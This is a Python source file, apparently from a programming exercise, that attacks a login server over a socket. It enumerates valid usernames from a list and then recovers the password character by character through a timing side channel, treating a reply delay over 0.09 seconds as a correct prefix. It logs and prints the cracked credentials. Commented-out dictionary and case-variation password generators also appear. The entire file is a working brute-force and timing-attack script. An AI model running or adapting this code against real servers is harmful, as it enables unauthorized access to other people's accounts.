import json
import socket
import argparse
import string
import itertools
from time import perf_counter

alpha = string.ascii_lowercase + string.ascii_uppercase
digits = string.digits
chars = alpha + digits

parser = argparse.ArgumentParser(description="socket program")

parser.add_argument("ip", help="ip address")
parser.add_argument("port", help="port", type=int)

args = parser.parse_args()


# numeric password generator
def password_generator():
    for gen in itertools.product(chars, repeat=1):
        yield gen


# numeric password generator
# def password_generator():
#     for i in range(1, 6):
#         for gen in itertools.product(chars, repeat=i):
#             yield gen


# # opening file with passwords
# with open("passwords.txt", "r", encoding="utf-8") as file:
#     content = file.readlines()

with open("logins.txt", "r", encoding="utf-8") as file:
    logins = file.readlines()


def write_file(_text):
    with open("logs.txt", "a", encoding="utf-8") as file:
        file.write(_text)


# creating lower - upper case combination of words
# def all_combinations():
#     for word in content:
#         word = word.strip()
#         word_list = map(''.join, itertools.product(*zip(word.upper(), word.lower())))
#         for _word in word_list:
#             yield _word

def find_login():
    for _login in logins:
        _login = _login.strip()
        _data = json.dumps({"login": _login, "password": " "})
        _data = _data.encode('utf-8')
        client_socket.send(_data)
        _response = client_socket.recv(1024)
        _result = json.loads(_response.decode('utf-8'))['result']
        if _result == "Wrong password!":
            return _login


def find_password(_login):
    _password = ""
    while True:
        for char in chars:
            _data = json.dumps({"login": _login, "password": _password + char})
            _data = _data.encode('utf-8')
            client_socket.send(_data)
            start = perf_counter()
            _response = client_socket.recv(1024)
            end = perf_counter()
            delay = end - start
            _result = json.loads(_response.decode('utf-8'))['result']
            if _result == "Connection success!":
                write_file("Connection success: ")
                write_file(_password + char + "\n")
                return _password + char
            elif _result == "Wrong password!" and delay > 0.09:
                write_file("delay: " + str(delay) + "\n")
                write_file("password: " + _password + char + "\n")
                _password += char
                break


# working with a socket as a context manager
with socket.socket() as client_socket:
    hostname = args.ip
    port = args.port

    address = (hostname, port)
    client_socket.connect(address)

    login = find_login()
    password = find_password(login)
    result = {"login": login, "password": password}
    result = json.dumps(result)

print(result)
